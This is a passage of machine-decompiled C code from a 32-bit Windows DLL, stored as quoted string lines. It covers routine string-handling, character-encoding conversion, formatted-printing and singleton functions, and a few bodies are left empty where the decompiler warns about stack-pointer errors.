    "  __int128 *v3; // eax",
    "  unsigned int v4; // ebx",
    "  __int128 v5; // xmm0",
    "  _DWORD *result; // eax",
    "  unsigned int v7; // esi",
    "  size_t v8; // ecx",
    "  void *v9; // eax",
    "  void *v10; // ecx",
    "  _DWORD *v11; // eax",
    "  int v12; // [esp-8h] [ebp-10h]",
    "  _OWORD *Src; // [esp+4h] [ebp-4h]",
    "",
    "  Src = a2;",
    "  v3 = (__int128 *)a2;",
    "  *(_OWORD *)this = 0;",
    "  this[4] = 0;",
    "  this[5] = 0;",
    "  if ( a2[5] > 0xFu )",
    "  {",
    "    v3 = (__int128 *)*a2;",
    "    Src = (_OWORD *)*a2;",
    "  }",
    "  v4 = a2[4];",
    "  if ( v4 > 0x7FFFFFFF )",
    "    sub_10001540();",
    "  if ( v4 <= 0xF )",
    "  {",
    "    this[4] = v4;",
    "    this[5] = 15;",
    "    v5 = *v3;",
    "    result = this;",
    "    *(_OWORD *)this = v5;",
    "    return result;",
    "  }",
    "  v7 = v4 | 0xF;",
    "  if ( (v4 | 0xF) > 0x7FFFFFFF )",
    "  {",
    "    v7 = 0x7FFFFFFF;",
    "    v8 = -2147483613;",
    "LABEL_8:",
    "    v9 = operator new(v8);",
    "    v10 = v9;",
    "    if ( !v9 )",
    "      _invalid_parameter_noinfo_noreturn();",
    "    v11 = (_DWORD *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);",
    "    *(v11 - 1) = v10;",
    "    goto LABEL_17;",
    "  }",
    "  if ( v7 < 0x16 )",
    "    v7 = 22;",
    "  v11 = (_DWORD *)(v7 + 1);",
    "  if ( v7 == -1 )",
    "    goto LABEL_17;",
    "  if ( (unsigned int)v11 >= 0x1000 )",
    "  {",
    "    v8 = v7 + 36;",
    "    if ( v7 + 36 < v7 + 1 )",
    "      sub_100014A0(v12);",
    "    goto LABEL_8;",
    "  }",
    "  v11 = operator new(v7 + 1);",
    "LABEL_17:",
    "  *this = v11;",
    "  this[4] = v4;",
    "  this[5] = v7;",
    "  memmove(v11, Src, v4 + 1);",
    "  return this;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_10009F60(_DWORD *this, void *Src, size_t Size)",
    "{",
    "  int v3; // ebx",
    "  unsigned int v5; // edx",
    "  int v6; // ecx",
    "  _DWORD *v7; // eax",
    "  char *v8; // esi",
    "  size_t v10; // [esp-4h] [ebp-Ch]",
    "",
    "  v3 = Size;",
    "  v5 = this[5];",
    "  v6 = this[4];",
    "  if ( Size > v5 - v6 )",
    "  {",
    "    v10 = Size;",
    "    LOBYTE(Size) = 0;",
    "    return (_DWORD *)sub_1000A260(this, v3, Size, (int)Src, v10);",
    "  }",
    "  else",
    "  {",
    "    this[4] = v6 + Size;",
    "    v7 = this;",
    "    if ( v5 > 0xF )",
    "      v7 = (_DWORD *)*this;",
    "    v8 = (char *)v7 + v6;",
    "    memmove((char *)v7 + v6, Src, Size);",
    "    v8[Size] = 0;",
    "    return this;",
    "  }",
    "}",
    "",
    "",
    "int __fastcall sub_10009FC0(int a1, _DWORD *a2, const void **Src)",
    "{",
    "  const void *v5; // edx",
    "  unsigned int v6; // ecx",
    "  int v7; // esi",
    "  bool v8; // cc",
    "  _DWORD *v9; // eax",
    "  void *v10; // esi",
    "  int result; // eax",
    "  _BYTE *Srca; // [esp+1Ch] [ebp+8h]",
    "",
    "  v5 = Src;",
    "  if ( (unsigned int)Src[5] > 0xF )",
    "    v5 = *Src;",
    "  v6 = (unsigned int)Src[4];",
    "  v7 = a2[4];",
    "  Srca = (_BYTE *)v6;",
    "  if ( v6 > a2[5] - v7 )",
    "  {",
    "    LOBYTE(Srca) = 0;",
    "    a2 = (_DWORD *)sub_1000A260(a2, v6, (int)Srca, (int)v5, v6);",
    "  }",
    "  else",
    "  {",
    "    v8 = a2[5] <= 0xFu;",
    "    a2[4] = v7 + v6;",
    "    v9 = a2;",
    "    if ( !v8 )",
    "      v9 = (_DWORD *)*a2;",
    "    v10 = (char *)v9 + v7;",
    "    memmove(v10, v5, v6);",
    "    Srca[(_DWORD)v10] = 0;",
    "  }",
    "  result = a1;",
    "  *(_OWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 16) = 0;",
    "  *(_DWORD *)(a1 + 20) = 0;",
    "  *(_OWORD *)a1 = *(_OWORD *)a2;",
    "  *(_QWORD *)(a1 + 16) = *((_QWORD *)a2 + 2);",
    "  a2[4] = 0;",
    "  a2[5] = 15;",
    "  *(_BYTE *)a2 = 0;",
    "  return result;",
    "}",
    "",
    "",
    "int __fastcall sub_1000A070(int a1, const char *a2, _DWORD *Src)",
    "{",
    "  int v3; // ebx",
    "  unsigned int v4; // esi",
    "  _OWORD *v5; // edi",
    "  int v6; // ecx",
    "  bool v7; // cf",
    "  bool v8; // zf",
    "  char *v9; // ebx",
    "  int result; // eax",
    "  char *Srca; // [esp+20h] [ebp+8h]",
    "",
    "  v3 = a1;",
    "  v4 = strlen(a2);",
    "  v5 = Src;",
    "  v6 = Src[4];",
    "  if ( v4 > Src[5] - v6 )",
    "  {",
    "    LOBYTE(Src) = 0;",
    "    v5 = (_OWORD *)sub_1000A7B0(v5, v4, (int)Src, v6, (int)a2, v4);",
    "  }",
    "  else",
    "  {",
    "    v7 = Src[5] < 0xFu;",
    "    v8 = Src[5] == 15;",
    "    Src[4] = v6 + v4;",
    "    v9 = (char *)Src;",
    "    if ( !v7 && !v8 )",
    "      v9 = (char *)*Src;",
    "    if ( &a2[v4] <= v9 || a2 > &v9[v6] )",
    "    {",
    "      Srca = (char *)v4;",
    "    }",
    "    else if ( v9 > a2 )",
    "    {",
    "      Srca = (char *)(v9 - a2);",
    "    }",
    "    else",
    "    {",
    "      Srca = 0;",
    "    }",
    "    memmove(&v9[v4], v9, v6 + 1);",
    "    memmove(v9, a2, (size_t)Srca);",
    "    memmove(&Srca[(_DWORD)v9], &Srca[v4 + (_DWORD)a2], v4 - (_DWORD)Srca);",
    "    v3 = a1;",
    "  }",
    "  result = v3;",
    "  *(_OWORD *)v3 = 0;",
    "  *(_DWORD *)(v3 + 16) = 0;",
    "  *(_DWORD *)(v3 + 20) = 0;",
    "  *(_OWORD *)v3 = *v5;",
    "  *(_QWORD *)(v3 + 16) = *((_QWORD *)v5 + 2);",
    "  *((_DWORD *)v5 + 4) = 0;",
    "  *((_DWORD *)v5 + 5) = 15;",
    "  *(_BYTE *)v5 = 0;",
    "  return result;",
    "}",
    "",
    "",
    "// bad sp value at call has been detected, the output may be wrong!",
    "_DWORD *__thiscall sub_1000A170(_DWORD *this, void *Src, unsigned int a3)",
    "{",
    "}// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_1000A260(void **Src, unsigned int a2, int a3, const void *a4, size_t Size)",
    "{",
    "}// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_1000A3C0(void **this, unsigned int a2, int a3, const void *a4)",
    "{",
    "}char **__thiscall sub_1000A4E0(char **this, int a2, _DWORD *a3, _DWORD *Src)",
    "{",
    "  _DWORD *v4; // ebx",
    "  _DWORD *v6; // edi",
    "  unsigned int v7; // edx",
    "  unsigned int v8; // ecx",
    "  unsigned int v9; // eax",
    "  int *v10; // edi",
    "  char *v12; // ebx",
    "  unsigned int v13; // eax",
    "  size_t v14; // eax",
    "  void *v15; // eax",
    "  char *v16; // ecx",
    "  int v17; // [esp-8h] [ebp-20h]",
    "  unsigned int v18; // [esp+4h] [ebp-14h]",
    "  size_t Size; // [esp+8h] [ebp-10h]",
    "  char *v20; // [esp+Ch] [ebp-Ch]",
    "  int v21; // [esp+10h] [ebp-8h]",
    "  unsigned int v22; // [esp+14h] [ebp-4h]",
    "",
    "  v4 = Src;",
    "  v6 = a3;",
    "  *(_OWORD *)this = 0;",
    "  this[4] = 0;",
    "  this[5] = 0;",
    "  v7 = a3[4];",
    "  v8 = Src[4];",
    "  Size = v7;",
    "  v18 = v8;",
    "  v22 = v8 + v7;",
    "  v9 = Src[5];",
    "  if ( v8 <= a3[5] - v7 && v9 <= a3[5] )",
    "  {",
    "    *(_OWORD *)this = *(_OWORD *)a3;",
    "    *((_QWORD *)this + 2) = *((_QWORD *)a3 + 2);",
    "    a3[4] = 0;",
    "    a3[5] = 15;",
    "    *(_BYTE *)a3 = 0;",
    "    v10 = (int *)this;",
    "    if ( (unsigned int)this[5] > 0xF )",
    "      v10 = (int *)*this;",
    "    if ( Src[5] > 0xFu )",
    "      v4 = (_DWORD *)*Src;",
    "    memmove((char *)v10 + v7, v4, v8 + 1);",
    "    this[4] = (char *)v22;",
    "    return this;",
    "  }",
    "  if ( v7 <= v9 - v8 )",
    "  {",
    "    *(_OWORD *)this = *(_OWORD *)Src;",
    "    *((_QWORD *)this + 2) = *((_QWORD *)Src + 2);",
    "    Src[4] = 0;",
    "    Src[5] = 15;",
    "    *(_BYTE *)Src = 0;",
    "    v12 = *this;",
    "    memmove(&(*this)[v7], *this, v8 + 1);",
    "    if ( a3[5] > 0xFu )",
    "      v6 = (_DWORD *)*a3;",
    "    memmove(v12, v6, Size);",
    "    this[4] = (char *)v22;",
    "    return this;",
    "  }",
    "  if ( 0x7FFFFFFF - v7 < v8 )",
    "    sub_10001540();",
    "  v13 = v22 | 0xF;",
    "  if ( (v22 | 0xF) > 0x7FFFFFFF )",
    "  {",
    "    v21 = 0x7FFFFFFF;",
    "    v14 = -2147483613;",
    "LABEL_15:",
    "    v15 = operator new(v14);",
    "    if ( !v15 )",
    "      _invalid_parameter_noinfo_noreturn();",
    "    v16 = (char *)(((unsigned int)v15 + 35) & 0xFFFFFFE0);",
    "    *((_DWORD *)v16 - 1) = v15;",
    "    goto LABEL_24;",
    "  }",
    "  if ( v13 < 0x16 )",
    "    v13 = 22;",
    "  v21 = v13;",
    "  v16 = (char *)(v13 + 1);",
    "  if ( v13 == -1 )",
    "    goto LABEL_25;",
    "  if ( (unsigned int)v16 >= 0x1000 )",
    "  {",
    "    v14 = v13 + 36;",
    "    if ( v16 + 35 < v16 )",
    "      sub_100014A0(v17);",
    "    goto LABEL_15;",
    "  }",
    "  v16 = (char *)operator new(v13 + 1);",
    "LABEL_24:",
    "  v13 = v21;",
    "LABEL_25:",
    "  this[4] = (char *)v22;",
    "  *this = v16;",
    "  this[5] = (char *)v13;",
    "  v20 = v16;",
    "  if ( a3[5] > 0xFu )",
    "    v6 = (_DWORD *)*a3;",
    "  memmove(v16, v6, Size);",
    "  if ( Src[5] > 0xFu )",
    "    v4 = (_DWORD *)*Src;",
    "  memmove(&v20[Size], v4, v18 + 1);",
    "  return this;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_1000A6C0(_DWORD *this, int a2, int a3, const void *a4, size_t Size, const void *a6, size_t a7)",
    "{",
    "  size_t v7; // edx",
    "  size_t v9; // ecx",
    "  unsigned int v10; // esi",
    "  _DWORD *v11; // edi",
    "  size_t v12; // ecx",
    "  void *v13; // eax",
    "  int v15; // [esp-Ch] [ebp-1Ch]",
    "",
    "  v7 = Size;",
    "  v9 = Size + a7;",
    "  v10 = 15;",
    "  *(_OWORD *)this = 0;",
    "  this[4] = 0;",
    "  this[5] = 0;",
    "  v11 = this;",
    "  if ( Size + a7 > 0xF )",
    "  {",
    "    v10 = v9 | 0xF;",
    "    if ( (v9 | 0xF) <= 0x7FFFFFFF )",
    "    {",
    "      if ( v10 < 0x16 )",
    "        v10 = 22;",
    "      if ( v10 == -1 )",
    "      {",
    "        v11 = 0;",
    "LABEL_15:",
    "        *this = v11;",
    "        goto LABEL_16;",
    "      }",
    "      if ( v10 + 1 < 0x1000 )",
    "      {",
    "        v11 = operator new(v10 + 1);",
    "LABEL_14:",
    "        v7 = Size;",
    "        v9 = Size + a7;",
    "        goto LABEL_15;",
    "      }",
    "      v12 = v10 + 36;",
    "      if ( v10 + 36 < v10 + 1 )",
    "        sub_100014A0(v15);",
    "    }",
    "    else",
    "    {",
    "      v10 = 0x7FFFFFFF;",
    "      v12 = -2147483613;",
    "    }",
    "    v13 = operator new(v12);",
    "    if ( !v13 )",
    "      _invalid_parameter_noinfo_noreturn();",
    "    v11 = (_DWORD *)(((unsigned int)v13 + 35) & 0xFFFFFFE0);",
    "    *(v11 - 1) = v13;",
    "    goto LABEL_14;",
    "  }",
    "LABEL_16:",
    "  this[4] = v9;",
    "  this[5] = v10;",
    "  memmove(v11, a4, v7);",
    "  memmove((char *)v11 + Size, a6, a7);",
    "  *((_BYTE *)v11 + Size + a7) = 0;",
    "  return this;",
    "}",
    "",
    "",
    "void **__thiscall sub_1000A7B0(void **Src, unsigned int a2, int a3, int a4, const void *a5, size_t Size)",
    "{",
    "  char *v7; // esi",
    "  unsigned int v8; // edi",
    "  unsigned int v9; // esi",
    "  size_t v10; // eax",
    "  void *v11; // eax",
    "  _DWORD *v12; // edi",
    "  void *v13; // esi",
    "  int v15; // [esp+0h] [ebp-1Ch]",
    "  unsigned int v16; // [esp+10h] [ebp-Ch]",
    "  char *v17; // [esp+14h] [ebp-8h]",
    "  char *v18; // [esp+18h] [ebp-4h]",
    "  char *v19; // [esp+18h] [ebp-4h]",
    "",
    "  v7 = (char *)Src[4];",
    "  v17 = v7;",
    "  if ( 0x7FFFFFFF - (int)v7 < a2 )",
    "    sub_10001540();",
    "  v8 = (unsigned int)Src[5];",
    "  v18 = &v7[a2];",
    "  v9 = (unsigned int)&v7[a2] | 0xF;",
    "  v16 = v8;",
    "  if ( v9 > 0x7FFFFFFF )",
    "  {",
    "    v9 = 0x7FFFFFFF;",
    "LABEL_4:",
    "    v10 = -2147483613;",
    "    goto LABEL_5;",
    "  }",
    "  if ( v8 > 0x7FFFFFFF - (v8 >> 1) )",
    "  {",
    "    v9 = 0x7FFFFFFF;",
    "    goto LABEL_4;",
    "  }",
    "  if ( v9 < v8 + (v8 >> 1) )",
    "    v9 = v8 + (v8 >> 1);",
    "  if ( v9 == -1 )",
    "  {",
    "    v12 = 0;",
    "    goto LABEL_17;",
    "  }",
    "  if ( v9 + 1 < 0x1000 )",
    "  {",
    "    v12 = operator new(v9 + 1);",
    "    goto LABEL_17;",
    "  }",
    "  v10 = v9 + 36;",
    "  if ( v9 + 36 < v9 + 1 )",
    "    sub_100014A0(v15);",
    "LABEL_5:",
    "  v11 = operator new(v10);",
    "  if ( !v11 )",
    "    goto LABEL_25;",
    "  v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);",
    "  *(v12 - 1) = v11;",
    "LABEL_17:",
    "  Src[4] = v18;",
    "  Src[5] = (void *)v9;",
    "  v19 = (char *)v12 + Size;",
    "  if ( v16 > 0xF )",
    "  {",
    "    v13 = *Src;",
    "    memmove(v12, a5, Size);",
    "    memmove(v19, v13, (size_t)(v17 + 1));",
    "    if ( v16 + 1 < 0x1000 )",
    "    {",
    "LABEL_21:",
    "      sub_100154EB(v13);",
    "      *Src = v12;",
    "      return Src;",
    "    }",
    "    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )",
    "    {",
    "      v13 = (void *)*((_DWORD *)v13 - 1);",
    "      goto LABEL_21;",
    "    }",
    "LABEL_25:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  memmove(v12, a5, Size);",
    "  memmove(v19, Src, (size_t)(v17 + 1));",
    "  *Src = v12;",
    "  return Src;",
    "}",
    "",
    "",
    "int sub_1000A900(wchar_t *Buffer, unsigned int a2, wchar_t *Format, ...)",
    "{",
    "  int v4; // ebx",
    "  size_t v5; // esi",
    "  _DWORD *v6; // eax",
    "  int v7; // eax",
    "  unsigned __int64 v8; // [esp-20h] [ebp-28h]",
    "  va_list va; // [esp+1Ch] [ebp+14h] BYREF",
    "",
    "  va_start(va, Format);",
    "  if ( !(a2 >> 1) )",
    "    return -2147024809;",
    "  v4 = 0;",
    "  v5 = (a2 >> 1) - 1;",
    "  v6 = sub_10003540();",
    "  HIDWORD(v8) = v6[1];",
    "  LODWORD(v8) = *v6 | 1;",
    "  v7 = __stdio_common_vswprintf(v8, Buffer, v5, Format, 0, va);",
    "  if ( v7 < 0 )",
    "    v7 = -1;",
    "  if ( v7 < 0 || v7 > v5 )",
    "  {",
    "    v4 = -2147024774;",
    "    Buffer[v5] = 0;",
    "  }",
    "  else if ( v7 == v5 )",
    "  {",
    "    Buffer[v5] = 0;",
    "    return 0;",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "int sub_1000A970()",
    "{",
    "  int result; // eax",
    "  int *Block; // [esp+8h] [ebp-14h]",
    "",
    "  result = dword_100408A4;",
    "  if ( !dword_100408A4 )",
    "  {",
    "    if ( _Mtx_lock((_Mtx_t)&unk_1003FB80) )",
    "      std::_Throw_Cpp_error(5);",
    "    if ( dword_1003FBAC == 0x7FFFFFFF )",
    "    {",
    "      dword_1003FBAC = 2147483646;",
    "      std::_Throw_Cpp_error(6);",
    "    }",
    "    if ( !dword_100408A4 )",
    "    {",
    "      Block = (int *)operator new(4u);",
    "      *Block = 0;",
    "      *Block = sub_10002FE0();",
    "      dword_100408A4 = (int)Block;",
    "    }",
    "    _Mtx_unlock((_Mtx_t)&unk_1003FB80);",
    "    return dword_100408A4;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __stdcall sub_1000AA30(int a1, CHAR *lpMultiByteStr, int a3, int a4, int a5, int cbMultiByte, unsigned int a7)",
    "{",
    "  int v7; // edi",
    "  __int128 v8; // xmm0",
    "  unsigned int v9; // eax",
    "  CHAR *v10; // ecx",
    "  const CHAR *p_lpMultiByteStr; // eax",
    "  unsigned int v12; // eax",
    "  _DWORD *v13; // esi",
    "  char *v14; // edi",
    "  char *v15; // ecx",
    "  char *v16; // edx",
    "  unsigned int v17; // edi",
    "  void *v18; // eax",
    "  const CHAR *v19; // eax",
    "  unsigned int v20; // eax",
    "  char *v21; // eax",
    "  void *v22; // edx",
    "  CHAR *v23; // edx",
    "  int v25; // [esp+0h] [ebp-64h]",
    "  unsigned int v26; // [esp+10h] [ebp-54h]",
    "  __int128 v27; // [esp+18h] [ebp-4Ch] BYREF",
    "  __int64 v28; // [esp+28h] [ebp-3Ch]",
    "  void *Block[4]; // [esp+30h] [ebp-34h] BYREF",
    "  __int64 v30; // [esp+40h] [ebp-24h]",
    "  __int64 v31; // [esp+48h] [ebp-1Ch]",
    "  char *v32; // [esp+50h] [ebp-14h]",
    "  int v33; // [esp+60h] [ebp-4h]",
    "",
    "  v7 = a1;",
    "  v33 = 0;",
    "  v30 = 0;",
    "  *(_OWORD *)Block = 0;",
    "  sub_1000A170(Block, &unk_1003B3C4, 0);",
    "  LOBYTE(v33) = 1;",
    "  if ( cbMultiByte )",
    "  {",
    "    p_lpMultiByteStr = (const CHAR *)&lpMultiByteStr;",
    "    if ( a7 > 0xF )",
    "      p_lpMultiByteStr = lpMultiByteStr;",
    "    v12 = MultiByteToWideChar(0xFDE9u, 0, p_lpMultiByteStr, cbMultiByte, 0, 0);",
    "    v13 = 0;",
    "    v26 = v12;",
    "    v14 = 0;",
    "    v15 = 0;",
    "    v31 = 0;",
    "    v16 = 0;",
    "    v32 = 0;",
    "    if ( v12 )",
    "    {",
    "      if ( v12 > 0x7FFFFFFF )",
    "        sub_10003530(0, 0);",
    "      v17 = 2 * v12;",
    "      if ( 2 * v12 )",
    "      {",
    "        if ( v17 < 0x1000 )",
    "        {",
    "          v13 = operator new(2 * v12);",
    "        }",
    "        else",
    "        {",
    "          if ( v17 + 35 < v17 )",
    "            sub_100014A0(v25);",
    "          v18 = operator new(v17 + 35);",
    "          if ( !v18 )",
    "            goto LABEL_36;",
    "          v13 = (_DWORD *)(((unsigned int)v18 + 35) & 0xFFFFFFE0);",
    "          *(v13 - 1) = v18;",
    "        }",
    "      }",
    "      v14 = (char *)v13 + v17;",
    "      LODWORD(v31) = v13;",
    "      v32 = v14;",
    "      memset(v13, 0, 2 * v26);",
    "      v15 = v14;",
    "      HIDWORD(v31) = v14;",
    "      v16 = (char *)v13;",
    "    }",
    "    LOBYTE(v33) = 2;",
    "    v19 = (const CHAR *)&lpMultiByteStr;",
    "    if ( a7 > 0xF )",
    "      v19 = lpMultiByteStr;",
    "    v20 = MultiByteToWideChar(0xFDE9u, 0, v19, cbMultiByte, (LPWSTR)v13, (v15 - v16) >> 1);",
    "    v28 = 0;",
    "    v27 = 0;",
    "    sub_1000A170(&v27, v13, v20);",
    "    *(_OWORD *)a1 = 0;",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "    *(_DWORD *)(a1 + 20) = 0;",
    "    *(_OWORD *)a1 = v27;",
    "    *(_QWORD *)(a1 + 16) = v28;",
    "    if ( v13 )",
    "    {",
    "      v21 = (char *)v13;",
    "      if ( ((v14 - (char *)v13) & 0xFFFFFFFE) >= 0x1000 )",
    "      {",
    "        v13 = (_DWORD *)*(v13 - 1);",
    "        if ( (unsigned int)(v21 - (char *)v13 - 4) > 0x1F )",
    "          goto LABEL_36;",
    "      }",
    "      sub_100154EB(v13);",
    "    }",
    "    if ( HIDWORD(v30) > 7 )",
    "    {",
    "      v22 = Block[0];",
    "      if ( (unsigned int)(2 * HIDWORD(v30) + 2) >= 0x1000 )",
    "      {",
    "        v22 = (void *)*((_DWORD *)Block[0] - 1);",
    "        if ( (unsigned int)((char *)Block[0] - (char *)v22 - 4) > 0x1F )",
    "          goto LABEL_36;",
    "      }",
    "      sub_100154EB(v22);",
    "    }",
    "    if ( a7 > 0xF )",
    "    {",
    "      v23 = lpMultiByteStr;",
    "      if ( a7 + 1 >= 0x1000 )",
    "      {",
    "        v23 = (CHAR *)*((_DWORD *)lpMultiByteStr - 1);",
    "        if ( (unsigned int)(lpMultiByteStr - v23 - 4) > 0x1F )",
    "          goto LABEL_36;",
    "      }",
    "      sub_100154EB(v23);",
    "    }",
    "    return a1;",
    "  }",
    "  *(_OWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 16) = 0;",
    "  v8 = *(_OWORD *)Block;",
    "  *(_DWORD *)(a1 + 20) = 0;",
    "  v9 = a7;",
    "  *(_OWORD *)a1 = v8;",
    "  *(_QWORD *)(a1 + 16) = v30;",
    "  if ( v9 > 0xF )",
    "  {",
    "    v10 = lpMultiByteStr;",
    "    if ( v9 + 1 < 0x1000 )",
    "    {",
    "LABEL_6:",
    "      sub_100154EB(v10);",
    "      return v7;",
    "    }",
    "    if ( (unsigned int)&lpMultiByteStr[-*((_DWORD *)lpMultiByteStr - 1) - 4] <= 0x1F )",
    "    {",
    "      v10 = (CHAR *)*((_DWORD *)lpMultiByteStr - 1);",
    "      goto LABEL_6;",
    "    }",
    "LABEL_36:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "int __stdcall sub_1000AD50(int a1, WCHAR *lpWideCharStr, int a3, int a4, int a5, int cchWideChar, unsigned int a7)",
    "{",
    "  int v7; // esi",
    "  __int128 v8; // xmm0",
    "  unsigned int v9; // ecx",
    "  WCHAR *v10; // edx",
    "  const WCHAR *p_lpWideCharStr; // eax",
    "  size_t v12; // eax",
    "  _DWORD *v13; // esi",
    "  char *v14; // edi",
    "  char *v15; // ecx",
    "  char *v16; // edx",
    "  void *v17; // eax",
    "  const WCHAR *v18; // eax",
    "  size_t v19; // eax",
    "  char *v20; // eax",
    "  void *v21; // edx",
    "  WCHAR *v22; // edx",
    "  int v24; // [esp+0h] [ebp-64h]",
    "  size_t Size; // [esp+10h] [ebp-54h]",
    "  __int128 v26; // [esp+18h] [ebp-4Ch] BYREF",
    "  __int64 v27; // [esp+28h] [ebp-3Ch]",
    "  void *Block[4]; // [esp+30h] [ebp-34h] BYREF",
    "  __int64 v29; // [esp+40h] [ebp-24h]",
    "  __int64 v30; // [esp+48h] [ebp-1Ch]",
    "  char *v31; // [esp+50h] [ebp-14h]",
    "  int v32; // [esp+60h] [ebp-4h]",
    "",
    "  v7 = a1;",
    "  v32 = 0;",
    "  v29 = 0;",
    "  *(_OWORD *)Block = 0;",
    "  sub_100018C0(Block, &unk_1003B3A1, 0);",
    "  LOBYTE(v32) = 1;",
    "  if ( cchWideChar )",
    "  {",
    "    p_lpWideCharStr = (const WCHAR *)&lpWideCharStr;",
    "    if ( a7 > 7 )",
    "      p_lpWideCharStr = lpWideCharStr;",
    "    v12 = WideCharToMultiByte(0xFDE9u, 0, p_lpWideCharStr, cchWideChar, 0, 0, 0, 0);",
    "    v13 = 0;",
    "    Size = v12;",
    "    v14 = 0;",
    "    v15 = 0;",
    "    v30 = 0;",
    "    v16 = 0;",
    "    v31 = 0;",
    "    if ( v12 )",
    "    {",
    "      if ( v12 > 0x7FFFFFFF )",
    "        sub_10003530(0, 0);",
    "      if ( v12 < 0x1000 )",
    "      {",
    "        v13 = operator new(v12);",
    "      }",
    "      else",
    "      {",
    "        if ( v12 + 35 < v12 )",
    "          sub_100014A0(v24);",
    "        v17 = operator new(v12 + 35);",
    "        if ( !v17 )",
    "          goto LABEL_34;",
    "        v13 = (_DWORD *)(((unsigned int)v17 + 35) & 0xFFFFFFE0);",
    "        *(v13 - 1) = v17;",
    "      }",
    "      v14 = (char *)v13 + Size;",
    "      LODWORD(v30) = v13;",
    "      v31 = (char *)v13 + Size;",
    "      memset(v13, 0, Size);",
    "      v15 = (char *)v13 + Size;",
    "      HIDWORD(v30) = (char *)v13 + Size;",
    "      v16 = (char *)v13;",
    "    }",
    "    LOBYTE(v32) = 2;",
    "    v18 = (const WCHAR *)&lpWideCharStr;",
    "    if ( a7 > 7 )",
    "      v18 = lpWideCharStr;",
    "    v19 = WideCharToMultiByte(0xFDE9u, 0, v18, cchWideChar, (LPSTR)v13, v15 - v16, 0, 0);",
    "    v27 = 0;",
    "    v26 = 0;",
    "    sub_100018C0(&v26, v13, v19);",
    "    *(_OWORD *)a1 = 0;",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "    *(_DWORD *)(a1 + 20) = 0;",
    "    *(_OWORD *)a1 = v26;",
    "    *(_QWORD *)(a1 + 16) = v27;",
    "    if ( v13 )",
    "    {",
    "      v20 = (char *)v13;",
    "      if ( (unsigned int)(v14 - (char *)v13) >= 0x1000 )",
    "      {",
    "        v13 = (_DWORD *)*(v13 - 1);",
    "        if ( (unsigned int)(v20 - (char *)v13 - 4) > 0x1F )",
    "          goto LABEL_34;",
    "      }",
    "      sub_100154EB(v13);",
    "    }",
    "    if ( HIDWORD(v29) > 0xF )",
    "    {",
    "      v21 = Block[0];",
    "      if ( (unsigned int)(HIDWORD(v29) + 1) >= 0x1000 )",
    "      {",
    "        v21 = (void *)*((_DWORD *)Block[0] - 1);",
    "        if ( (unsigned int)((char *)Block[0] - (char *)v21 - 4) > 0x1F )",
    "          goto LABEL_34;",
    "      }",
    "      sub_100154EB(v21);",
    "    }",
    "    if ( a7 > 7 )",
    "    {",
    "      v22 = lpWideCharStr;",
    "      if ( 2 * a7 + 2 >= 0x1000 )",
    "      {",
    "        v22 = (WCHAR *)*((_DWORD *)lpWideCharStr - 1);",
    "        if ( (unsigned int)((char *)lpWideCharStr - (char *)v22 - 4) > 0x1F )",
    "          goto LABEL_34;",
    "      }",
    "      sub_100154EB(v22);",
    "    }",
    "    return a1;",
    "  }",
    "  *(_OWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 16) = 0;",
    "  v8 = *(_OWORD *)Block;",
    "  *(_DWORD *)(a1 + 20) = 0;",
    "  v9 = a7;",
    "  *(_OWORD *)a1 = v8;",
    "  *(_QWORD *)(a1 + 16) = v29;",
    "  if ( v9 > 7 )",
    "  {",
    "    v10 = lpWideCharStr;",
    "    if ( 2 * v9 + 2 < 0x1000",
    "      || (v10 = (WCHAR *)*((_DWORD *)lpWideCharStr - 1), (unsigned int)((char *)lpWideCharStr - (char *)v10 - 4) <= 0x1F) )",
    "    {",
    "      sub_100154EB(v10);",
    "      return v7;",
    "    }",
    "LABEL_34:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_1000B000(_DWORD *a1, _DWORD *a2, int a3, int a4, int a5, unsigned int a6, unsigned int a7)",
    "{",
    "  _DWORD *v7; // esi",
    "  unsigned int v8; // eax",
    "  unsigned int v9; // edx",
    "  int v10; // edi",
    "  unsigned int v11; // eax",
    "  size_t v12; // ecx",
    "  _DWORD **v13; // eax",
    "  char *v14; // edi",
    "  unsigned int v15; // esi",
    "  unsigned int i; // eax",
    "  char v17; // cl",
    "  int v18; // edx",
    "  int v19; // ecx",
    "  char *v20; // edi",
    "  int v21; // esi",
    "  char v22; // al",
    "  unsigned int v23; // ecx",
    "  unsigned int v24; // edx",
    "  _DWORD *v25; // edi",
    "  _BYTE *v26; // edx",
    "  _BYTE *v27; // edx",
    "  _BYTE *Block; // [esp+10h] [ebp-48h]",
    "  int v30; // [esp+14h] [ebp-44h]",
    "  char *v31; // [esp+1Ch] [ebp-3Ch]",
    "  unsigned int v32; // [esp+20h] [ebp-38h]",
    "  int v33; // [esp+24h] [ebp-34h]",
    "  char v34[4]; // [esp+28h] [ebp-30h] BYREF",
    "  char v35; // [esp+2Fh] [ebp-29h]",
    "  __int128 v36; // [esp+30h] [ebp-28h] BYREF",
    "  unsigned int v37; // [esp+40h] [ebp-18h]",
    "  unsigned int v38; // [esp+44h] [ebp-14h]",
    "  int v39; // [esp+54h] [ebp-4h]",
    "",
    "  v7 = a1;",
    "  v39 = 1;",
    "  *(_OWORD *)a1 = 0;",
    "  a1[4] = 0;",
    "  a1[5] = 0;",
    "  sub_100018C0(a1, &unk_1003B3A1, 0);",
    "  v8 = a6;",
    "  v9 = 0;",
    "  v32 = 0;",
    "  v10 = 1;",
    "  if ( a6 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v37 = 0;",
    "      v38 = 0;",
    "      v36 = 0;",
